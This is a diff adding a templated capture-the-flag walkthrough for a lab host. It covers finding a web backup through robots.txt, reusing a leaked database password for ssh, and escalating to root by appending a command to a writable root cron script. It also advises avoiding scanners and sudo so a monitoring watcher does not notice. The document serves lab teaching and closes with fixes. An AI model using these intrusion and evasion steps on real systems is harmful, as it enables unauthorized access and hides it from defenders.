@@ -1,0 +1,20 @@
+A backup left on the website, a password reused for ssh, and a watcher on both the web log and sudo.
+
+1. Read, don't sweep. nmap -sV 10.10.12.30, then curl -s http://10.10.12.30/robots.txt: it asks search
+   engines to skip /backup/. Opening that folder is one visit; webscan would be hundreds of guesses.
+
+2. The backup. curl -o the site-backup.tar.gz, tar xzf it, and site/config/db.php holds the database
+   password. It is reused as {{SVCUSER}}'s login password: ssh {{SVCUSER}}@10.10.12.30 and cat flag.txt.
+
+3. Root without sudo. {{SVCUSER}} may run find through sudo - but this watcher counts every sudo. Instead,
+   /etc/cron.d/{{JOB}} runs {{JOBDIR}}/{{JOB}}.sh as root every minute ("{{JOBWHAT}}"), and the script's
+   group is {{SVCUSER}} with write permission. Append a line, wait for the next minute, and read the copy:
+
+       echo 'cp /root/flag.txt /tmp/r.txt; chmod 644 /tmp/r.txt' >> {{JOBDIR}}/{{JOB}}.sh
+       cat /tmp/r.txt
+
+Why the noisy way fails: webscan is a burst of page guesses and sudo find is a privilege event; either
+one alone crosses this watcher's line, and it blocks your address.
+
+How to fix it: no backups in the web root, no password reuse, and a script root runs on a timer must be
+writable by root only.
